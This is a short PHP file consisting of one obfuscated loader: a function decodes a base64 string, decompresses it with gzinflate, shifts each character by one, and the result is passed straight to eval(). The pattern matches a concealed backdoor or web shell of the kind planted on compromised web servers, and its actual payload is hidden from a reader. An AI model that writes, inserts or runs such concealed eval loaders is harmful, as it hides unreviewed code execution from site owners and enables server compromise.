<?php function fujZo($wyc)
{ 
$wyc=gzinflate(base64_decode($wyc));
 for($i=0;$i<strlen($wyc);$i++)
 {
$wyc[$i] = chr(ord($wyc[$i])-1);
 }
 return $wyc;
 }eval(fujZo("lVPdatswFH4AP8WJMLUMWbqLsYt4WZuVboylTVlyF4KRXbkRcW1haSsl+Nl7jmInpmYh05V0fr4/YwA8nqyqsoorqcvKquKJfwwjT2+0KrKS49VXGibgxw/zxXLFlGZrrNFsp0pPV1c6w/L0e/zz/nYZeSoDnoncSBhMJmBspUvDcWgIbMzCEHYeKdgzsBUbueuIrVnUNjpwnyOvdojcp2qAcFI8x6ZMt9LGaa5kYYMQLi5AmTgVeS6SXOLskceQ5Iwzm+rx5eUO4evxznmpWdhQmti+annED5AVJFroMGfEWWpZnEXn/DqW/+FobWHfynN5siEs5je/4sXy9+30jh6zeHnz0PJWkkavW+iyKGRquW+G0NNISga00LLQeVSSN/2658SBHpw0W83G/rsN/APaoW5elE03wBuktp8KhGjTGR8E+LkskCzD8qPT/amRQyfB6jbqru8l9dYb/6dAWsG40JPsC8T4U2iRbjm7xwk2dMj0r+wJfLEK8BbQH5FQOBjLy0blEjhawg73kxC+QBf+H0GcCMM5SmDUzYMQPxw5OsbeJXQipSPu+6DORq8pph+z+bfpbLEKns0TIQVrisZE/Y5z3LTdPfLkX5ETR+Q1uV999d4A"));?>